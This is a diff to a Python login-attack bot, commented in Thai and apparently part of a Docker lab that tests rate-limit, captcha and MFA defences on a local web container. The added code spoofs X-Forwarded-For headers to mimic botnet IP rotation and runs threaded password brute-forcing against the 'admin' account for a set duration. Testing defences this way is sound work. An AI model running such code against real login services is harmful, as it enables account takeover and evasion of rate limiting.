@@ -5,17 +5,21 @@ import socket
 import random
 import string
 import concurrent.futures
+import threading
 
 # อ่าน endpoint จาก Docker Compose
-# ค่า default: basic (ไม่มี Rate Limit)
-# เปลี่ยนเป้าหมายผ่าน env TARGET_ENDPOINT ใน docker-compose.yml
-# - "basic"      → http://web:3000/api/login/basic
-# - "rate-limit" → http://web:3000/api/login/rate-limit
 TARGET_ENDPOINT = os.getenv("TARGET_ENDPOINT", "basic")
 TARGET_URL = f"http://web:3000/api/login/{TARGET_ENDPOINT}"
-CONCURRENCY = 10 # จำนวน Thread ที่ยิงพร้อมกันต่อ 1 Bot Container
+CONCURRENCY = int(os.getenv("CONCURRENCY", 10))
+DURATION = int(os.getenv("DURATION", 60))
 
-# ฟังก์ชันดึง IP ของ Container ตัวเอง
+# IP Spoofing Mode:
+#   "random" → สุ่ม IP ใหม่ทุก request (จำลอง Advanced Residential Proxy Botnet)
+#   "pool"   → สุ่มจาก IP Pool จำกัด (จำลอง Cheap Botnet / Datacenter Proxies)
+#   "fixed"  → ใช้ IP จริงของ Container
+SPOOF_MODE = os.getenv("SPOOF_MODE", "pool")
+IP_POOL_SIZE = int(os.getenv("IP_POOL_SIZE", 50))
+
 def get_my_ip():
     try:
         hostname = socket.gethostname()
@@ -23,52 +27,85 @@ def get_my_ip():
     except:
         return "Unknown"
 
+def generate_random_ip():
+    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+
 def generate_random_password():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=16))
 
-def attack_worker(worker_id):
+# Pre-generate IP Pool ตอนเริ่มต้น (ใช้ซ้ำตลอดการโจมตี)
+IP_POOL = [generate_random_ip() for _ in range(IP_POOL_SIZE)]
+
+
+PASSWORD_POOL = [generate_random_password() for _ in range(1000)]
+def attack_worker(worker_id, stop_event):
     my_ip = get_my_ip()
-    # จำลองข้อมูล Login
-    payload = {
-        "username": "admin",
-        "password": generate_random_password() # สุ่มรหัสผ่านผิดๆ
-    }
-
-    try:
-        # ยิง Request ไปที่ endpoint เดียวที่ถูกตั้งค่า
-        # ใช้ timeout สั้นๆ (1s) เพื่อให้ loop เร็วขึ้น
-        response = requests.post(TARGET_URL, json=payload, timeout=1)
-
-        # เช็คผลลัพธ์
-        if response.status_code == 200:
-            print(f"[BOT-{worker_id}]  เจาะเข้าได้แล้ว! Response: {response.text}")
-        elif response.status_code == 429:
-            print(f"[BOT-{worker_id}]  ถูกบล็อก! (Rate Limited)")
-        else:
-            print(f"[BOT-{worker_id}]  เจาะไม่เข้า (Status: {response.status_code})")
+    
+    while not stop_event.is_set():
+        # --- [MODIFIED] Dynamic Payload ตาม Endpoint ---
+        payload = {
+            "username": "admin",
+            "password": random.choice(PASSWORD_POOL) # ดึงจาก Pool ลดภาระ CPU
+        }
+        
+        # เพิ่มฟิลด์ให้ตรงกับที่ Web Server ต้องการ เพื่อให้ทะลุ Validation ไปถึงชั้นทดสอบได้
+        if TARGET_ENDPOINT == "captcha":
+            payload["captchaToken"] = "invalid-token-from-bot"
+        elif TARGET_ENDPOINT == "mfa":
+            payload["mfaCode"] = "000000" # ส่งรหัสผิด เพื่อไปกระตุ้น otplib
             
-    except Exception as e:
-        # Error เยอะๆ ไม่ต้องปริ้นท์หมด เดี๋ยวรก Log
-        # print(f"[BOT-{worker_id}]  Error: {e}")
-        pass
+        headers = {}
+        if SPOOF_MODE == "random":
+            headers["X-Forwarded-For"] = generate_random_ip()
+        elif SPOOF_MODE == "pool":
+            headers["X-Forwarded-For"] = random.choice(IP_POOL)
+        else:  # "fixed"
+            headers["X-Forwarded-For"] = my_ip
+
+        try:
+            # ใช้ requests.post แบบไม่มี Session ถูกต้องแล้ว เพื่อบังคับให้เกิด TCP Handshake ใหม่
+            response = requests.post(TARGET_URL, json=payload, headers=headers, timeout=1)
+
+            if response.status_code == 200:
+                print(f"[BOT-{worker_id}]  เจาะเข้าได้แล้ว! Response: {response.text}")
+            elif response.status_code == 429:
+                print(f"[BOT-{worker_id}]  ถูกบล็อก! (Rate Limited)")
+            # สามารถซ่อน Log อื่นๆ ได้ตามเดิมเพื่อไม่ให้ Terminal รก
+                
+        except Exception as e:
+            pass
 
 def start_attack():
+    spoof_desc = {
+        "random": "เปิด — Random IP ทุก request (Advanced Botnet)",
+        "pool": f"เปิด — IP Pool จำกัด {IP_POOL_SIZE} IPs (Cheap Botnet)",
+        "fixed": "ปิด — ใช้ IP จริงของ Container"
+    }
+    
     print(f"[*] เริ่มต้นโจมตีไปที่: {TARGET_URL}")
     print(f"[*] โหมด: {TARGET_ENDPOINT}")
     print(f"[*] ความแรง: {CONCURRENCY} Threads/Container")
-    print("[*] กำลังรอให้ Web Server ตื่น... (10 วินาที)")
-    time.sleep(10) # รอแป๊บนึงให้ Next.js บูทเสร็จ
+    print(f"[*] ระยะเวลา: {DURATION} วินาที")
+    print(f"[*] IP Spoofing: {spoof_desc.get(SPOOF_MODE, SPOOF_MODE)}")
+    print("[*] กำลังรอให้ Web Server ตื่น... (5 วินาที)")
+    time.sleep(5) 
 
-    print("[*] 🔥 FIRE !!!")
+    print("[*] FIRE !!!")
     
-    # ใช้ ThreadPoolExecutor เพื่อยิงรัวๆ
+    stop_event = threading.Event()
+    
     with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
-        while True:
-            # ส่งงานเข้า Queue ตลอดเวลา
-            futures = [executor.submit(attack_worker, i) for i in range(CONCURRENCY)]
-            # รอให้ชุดนี้เสร็จบางส่วนแล้วค่อยเติมใหม่ (หรือ loop ไปเลยก็ได้)
-            # แต่เพื่อ performance ที่ดี ปล่อยให้ executor จัดการ
-            concurrent.futures.wait(futures, return_when=concurrent.futures.FIRST_COMPLETED)
+        futures = [executor.submit(attack_worker, i, stop_event) for i in range(CONCURRENCY)]
+        
+        time.sleep(DURATION)
+        
+        print("[*] หมดเวลาโจมตี กำลังสั่งหยุด Worker...")
+        stop_event.set()
+        
+        concurrent.futures.wait(futures)
+        
+    print("[*] การโจมตีเสร็จสิ้น")
 
 if __name__ == "__main__":
     start_attack()
+
